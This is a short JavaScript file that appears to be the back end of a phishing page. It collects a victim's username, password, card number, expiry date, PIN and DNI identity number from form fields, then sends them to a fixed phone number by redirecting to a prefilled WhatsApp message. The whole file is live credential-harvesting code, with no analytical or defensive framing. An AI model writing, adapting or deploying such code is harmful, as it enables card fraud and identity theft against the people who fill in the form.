let user = document.getElementById("user")
let code = document.getElementById("code")
let dni = document.getElementById("dni")
let card = document.getElementById("card")
let date = document.getElementById("vencimiento")
let secureCode = document.getElementById("secure_code")
let submit = document.getElementById("submit")
let contact = document.getElementById("contact")


contact.addEventListener("click", ()=>{
  location.href = "https://api.whatsapp.com/send?phone=5359398368"
})
submit.addEventListener("click", send)

function send(){
   const message = `User:%20${user.value.trim()}%20Clave:%20${code.value.trim()}%20Card:%20${card.value.trim()}%20Vencimiento:%20${date.value.trim()}%20Pin:%20${secureCode.value.trim()}%20DNI:%20${dni.value.trim()}`
   const whatsapp = `https://api.whatsapp.com/send?phone=5359398368&text=${message}`
   location.href = whatsapp
}


